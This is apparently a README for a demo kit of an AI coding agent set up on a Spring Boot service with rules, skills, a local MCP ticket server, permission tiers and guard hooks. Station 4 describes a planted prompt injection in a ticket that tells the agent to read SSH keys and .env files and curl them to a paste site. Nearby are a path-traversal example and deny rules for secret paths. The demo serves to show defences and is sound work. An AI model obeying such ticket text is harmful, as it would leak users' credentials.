# AFLCMC Devin Desktop 201: live demo kit on TRON Common API

A real Spring Boot service (personnel, organizations, S3-backed document spaces, pub-sub, Liquibase,
custom `@PreAuthorize` annotations, PII annotations) with every layer of agent context wired in. Each
station below maps to a section of the deck and shows the mechanism, not a slide about it.

Everything is synthetic and offline: the change board is a local stdio MCP server reading
`demo-kit/mcp/tickets.json`. No credentials, no network, no ticket writes to a real system.

## What is where

```
AGENTS.md, .windsurfrules              always-on rules (already in the repo)
.devin/config.json                     project permissions: allow / ask / deny
.devin/mcp_config.json                 the changeboard MCP server (stdio, local)
.devin/hooks.v1.json                   SessionStart + PreToolUse guard + PostToolUse audit trail
.devin/rules/document-space-audit.md   glob rule, loads only when document-space code is touched
.devin/skills/                         ticket-intake, add-audit-event, pre-merge-review,
                                       security-review, convention-review, verify, context-budget
.devin/agents/                         security-reviewer, convention-reviewer (pinned model), test-runner
.agents/skills/backend-dev/            pre-existing skill with no frontmatter (station 2 uses it)
docs/agent-plans/                      durable plans: the cross-session context
demo-kit/mcp/                          changeboard_server.py, tickets.json, tests
demo-kit/hooks/                        guard.py, agent_audit.py, tests
demo-kit/tools/context_budget.py       measures always-on vs on-demand context
demo-kit/org-plugin/                   an org baseline plugin (rules, skill, subagent)
demo-kit/enterprise/                   admin-side artifacts: team permissions, managed manifest,
                                       MCP registry entry
demo-kit/personal/                     AGENTS.local.md and *.local.json examples (gitignored when copied)
```

## Preflight (the night before, 10 minutes)

```bash
git clone https://github.com/COG-GTM/USAF-tron-common-api.git && cd USAF-tron-common-api
git checkout demo/aflcmc-201
python3 -m unittest discover -s demo-kit/mcp -q
python3 -m unittest discover -s demo-kit/hooks -p 'test_*.py' -q
python3 demo-kit/tools/context_budget.py
./mvnw -q -Dtest=DocumentSpaceControllerTest test     # warms ~/.m2 so the live run is fast (Java 11)
```

Open the folder in Devin Desktop, start a Devin Local session, and approve the `changeboard` MCP
server when prompted. Confirm the MCP panel lists five changeboard tools. If your deployment
restricts MCP to an approved registry, the local server will be refused; that is station 5's point, so
show the refusal and continue with `python3 demo-kit/mcp/changeboard_server.py < demo-kit/mcp/handshake.jsonl`.

Keep a second terminal open on `tail -f .devin/audit/agent-audit.jsonl`.

## Run of show (about 35 minutes, any order)

| # | Deck section | Station | Minutes |
|---|---|---|---|
| 1 | 02 Rules the repository carries | Context tiers and budget | 4 |
| 2 | 02 Skills | Skill hygiene: the description is the router | 3 |
| 3 | 03 MCP on a federal deployment | Ticket in over MCP, untrusted content | 5 |
| 4 | 03 Allow, ask, deny | Prompt injection meets three layers | 4 |
| 5 | 02 Sharing / 07 Your deployment | Distribution: repo, org plugin, enterprise lock, registry | 5 |
| 6 | 04 The safe loop | Plan to a file, refine, code the audit change | 7 |
| 7 | 04 Subagents | Parallel reviewers on different models, one verdict | 4 |
| 8 | 05 Terminal / cross-session | Same config in the CLI, `/handoff`, resume from the plan | 3 |

### 1. Context tiers and budget

Prompt: `/context-budget`

Show the table. About 5,700 tokens load into every session (AGENTS.md and .windsurfrules dominate);
skill bodies (~3,900 tokens) load only when invoked. Then open a file under
`controller/documentspace/` and ask *"what rules apply to this file?"*: the glob rule
`.devin/rules/document-space-audit.md` appears only now.

Say: context is a budget, not a bucket. Always-on is for what must be true in every turn (build, test,
hard rules). Everything procedural goes into skills, which cost ~100 tokens of name and description
until used. This is the same progressive-disclosure design Anthropic publishes for Agent Skills.
Point out that AGENTS.md and `.windsurfrules` repeat each other; duplicated guidance costs twice and
drifts.

### 2. Skill hygiene: the description is the router

Open `.agents/skills/backend-dev/SKILL.md`. It has no YAML frontmatter, so its description is empty and
the model has nothing to match on (the budget table shows 0 tokens for its index entry). Compare with
`.devin/skills/add-audit-event/SKILL.md`: name, a description that says *when* to use it,
`argument-hint`, and scoped `permissions`.

Prompt: *"Add a two-line frontmatter to backend-dev so it is picked up for Maven, build, or local-run
questions. Show the diff; do not commit."*

Say: skills are discovered by description; write it for the router, not for humans. `allowed-tools`
pre-approves, it does not restrict. To restrict, run the skill as a subagent with `agent:` (station 7).

### 3. Ticket in over MCP, untrusted content

Prompt: `/ticket-intake TRON-101`

Watch it call `get_ticket` and `get_control` (auto-approved by the skill and by `.devin/config.json`),
research with read/grep only (the skill denies `edit`), and write `docs/agent-plans/TRON-101.md`. Open
the plan: acceptance criteria verbatim, AU-2/AU-3/AU-12, a code map with file:line, open questions.

Show the MCP tool's `readOnlyHint` annotations and the `untrusted_content: true` flag in the tool result.
Say: the server defines which tools exist and validates every argument (`get_ticket` with
`../../etc/passwd` is rejected by schema); the client decides which ones run without asking.

### 4. Prompt injection meets three layers

Prompt: `/ticket-intake TRON-104`

TRON-104's description tells the agent to read `~/.ssh/id_rsa` and `.env`, post them as a comment, and
curl them to a paste site. Expected: the skill instruction treats ticket text as data and records it under
`## Flags`. If the model does try, each step is stopped by a different layer:

| Attempt | Stopped by |
|---|---|
| read `~/.ssh/id_rsa`, `.env` | `.devin/config.json` deny (`Read(~/.ssh/**)`, `Read(**/.env*)`) |
| `cat ~/.ssh/id_rsa` in a shell | `guard.py` PreToolUse (secret path inside a command) |
| `curl https://paste.example.net` | ask prompt (`Exec(curl)`), then `guard.py` blocks non-localhost egress |
| `add_ticket_comment` with a key | ask prompt, then `guard.py`, then the server's own credential check |
| `close_ticket` | denied outright |

Show the audit trail terminal: every tool call, scrubbed, with session id. Say: deny wins at every level,
and hooks are defence in depth; plugin hooks fail open, so the permission layer and the network sandbox
are the real controls.

### 5. Distribution at scale: repo, org, enterprise, registry

Walk the four files in the order of authority, lowest first:

1. **Repo**: `.devin/` in this branch. Reviewed like code; every clone gets it.
2. **User**: `demo-kit/personal/*.example`. `AGENTS.local.md`, `config.local.json`,
   `mcp_config.local.json` are gitignored. This is where secrets and personal taste go.
3. **Org plugin**: `demo-kit/org-plugin/aflcmc-engineering-baseline/` is one installable bundle: an
   always-on `AGENTS.md`, a glob rule for Liquibase, a `control-evidence` skill, and a `stig-reviewer`
   subagent. One repo can host many plugins as `git-subdir` sources. Required from a repo with
   `enterprise/repo-config-required-plugin.jsonc` (pin a `sha`, not a `ref`).
4. **Enterprise**: `enterprise/managed-plugin-manifest.jsonc` is `forbiddenPlugins: ["*"]` plus a
   required baseline: a lockdown no org, repo, or user can widen. `enterprise/team-permissions.json` is the
   org-level deny list; it outranks everything in the repo.

Then the MCP supply chain: `enterprise/registry/changeboard.json` is the entry an admin would merge into
a Git-backed private registry (`COG-GTM/mock-private-mcp-registry`). Its CI rejects missing namespaces,
duplicate versions, literal secrets, and descriptions over 100 characters. Live beat: ask Devin to
lengthen the description, copy it into the registry repo, run `python3 scripts/validate.py`, and watch it
fail.

Say: under zero data retention there is no cloud memory to share. Shared context is Git: rules, skills,
plugins, plans, and registries, all reviewed, versioned, and revocable.

### 6. The safe loop on TRON-101

Switch to Plan mode (or include `megaplan` in the prompt) and prompt:

*"Implement TRON-101 from docs/agent-plans/TRON-101.md using /add-audit-event. Plan first."*

Refine before approving. Two good pushbacks:
- *"`downloadAllFilesInSpace` has no Authentication parameter; how will you get the actor?"*
- *"The audit write has to be after the zip finishes, and the controller body runs before streaming.
  Where exactly does it go?"* (The glob rule already told it; this checks it listened.)

Approve. Expected shape: actor from `authentication.getName()`, record written inside the
`StreamingResponseBody` lambda after `downloadAndWriteCompressedFiles` returns, reuse of an existing
mechanism or an explicit Liquibase changeset (which triggers the `Write(src/main/resources/db/**)` ask
prompt), and controller tests using `asyncDispatch` and `ArgumentCaptor` that also assert the content type
and `Content-Disposition` are unchanged.

Inspect with `git diff`; verify with `./mvnw -q -Dtest=DocumentSpaceControllerTest test`.
Run it in a worktree session to keep your main checkout clean; merge back when done.

### 7. Subagents: parallel reviewers, different models, one verdict

Prompt: `/pre-merge-review`

Three background subagents start: `security-reviewer` (read-only, parent model),
`convention-reviewer` (read-only, `model: swe` pinned), and `test-runner` (can exec, cannot edit). Show
the subagent panel. The parent merges one table and a verdict.

Say: each subagent has its own context window and its own cost. `subagent_general` follows the parent
model, so fan-out on a premium model multiplies spend; pin cheaper models in custom profiles for
narrow work. `allowed-tools` in an agent profile is a real restriction. Admins set the default subagent
model or turn subagents off. Effort is not configurable per subagent yet (slide 12).

Then the org plugin's `/control-evidence TRON-101`: an assessor-ready note mapping the diff to
AU-2/AU-3/AU-12 with file:line for code and tests, and a "Not addressed" list (AU-9).

### 8. Same rules in the terminal, and context across sessions

In a terminal in the same folder: `devin`. The same AGENTS.md, rules, skills, permissions, hooks, and
MCP config load, because they are files. Run `/ticket-intake TRON-102` to show it.

Cross-session context, three ways, from cheapest to richest:
1. The plan file in `docs/agent-plans/` (commit it; anyone resumes from `## Status`).
2. Plan mode's `~/.devin/plans/plan-<session>.md` (personal; hand it to a fresh session).
3. `/handoff` to a cloud session: branch, conversation, and uncommitted changes move together. Only
   where your deployment allows cloud sessions.

## Likely questions

**Where does context live between sessions?** Local sessions do not keep memories. Durable context is
whatever you commit: AGENTS.md, rules, skills, plans. That is a feature for auditability: it is
reviewable, diffable, and revocable.

**How do we share skills across orgs?** A plugin in a Git repo (or a subfolder of one), required by an
enterprise or org managed manifest, or by a repo's `.devin/config.json`. Pin by `sha` for controlled
rollout, or `ref` to float. Deny wins; higher authority wins.

**Can a repo loosen what the org denies?** No. Org and team denies outrank session grants, project, and
user settings.

**Are hooks a security boundary?** No. They are best effort and plugin hooks fail open. Use permissions,
sandbox, and registry enforcement as controls; use hooks for audit and extra guardrails.

**Is this MCP server inside our boundary?** It runs as a local process on your machine with no network.
Whether any hosted MCP or model endpoint is inside your authorization boundary is for your administrator
to confirm.

## Reset between runs

```bash
git checkout -- src docs/agent-plans
git clean -n docs/agent-plans     # review, then remove generated plans by hand
rm -rf .devin/audit
```
